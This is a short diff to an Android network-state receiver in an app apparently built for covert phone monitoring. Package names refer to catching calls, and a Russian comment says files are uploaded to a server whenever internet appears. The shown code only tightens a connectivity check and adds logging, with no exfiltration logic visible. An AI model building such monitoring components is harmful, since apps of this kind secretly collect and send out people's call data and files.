@@ -1,5 +1,6 @@
 package com.postal.omniscient.postal.networkStateReceiver;
 
+import android.app.ActivityManager;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -11,6 +12,7 @@ import android.util.Log;
 import android.widget.Toast;
 
 import com.postal.omniscient.MainActivity;
+import com.postal.omniscient.postal.catchPhone.Call.TService;
 import com.postal.omniscient.postal.downloadFiles.DownloadFileRun;
 import com.postal.omniscient.postal.service.StartService;
 
@@ -49,19 +51,20 @@ public class NetworkStateReceiver extends BroadcastReceiver {
             final ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
             final NetworkInfo ni = connectivityManager.getActiveNetworkInfo();
 
-
-
-
-
-
-
-            if (ni != null && ni.isConnectedOrConnecting()) {
+            if (ni != null && ni.isConnected()) {
                 if(i==4) {
                     Log.d(Msg, "FILE OUTPUT " + readFromFile(context));
                     Log.i(Msg, "Network " + ni.getTypeName() + " connected");
 
 
-                    startTransferFile(context);// Начать загрузку файлов на сервер при появлении интернета
+//                    if (connectivityManager.getActiveNetworkInfo() != null
+//                            && connectivityManager.getActiveNetworkInfo().isAvailable()
+//                            && connectivityManager.getActiveNetworkInfo().isConnected()) {}
+
+                    
+                        Log.i("MyMsg", "ЗАПУСК ПЕредаЧИ НА СЕРВЕР ИНФЫ");
+                        startTransferFile(context);// Начать загрузку файлов на сервер при появлении интернета
+
                 }
             } else if (intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY, Boolean.FALSE)) {
                 Log.d(Msg, "There's no network connectivity");
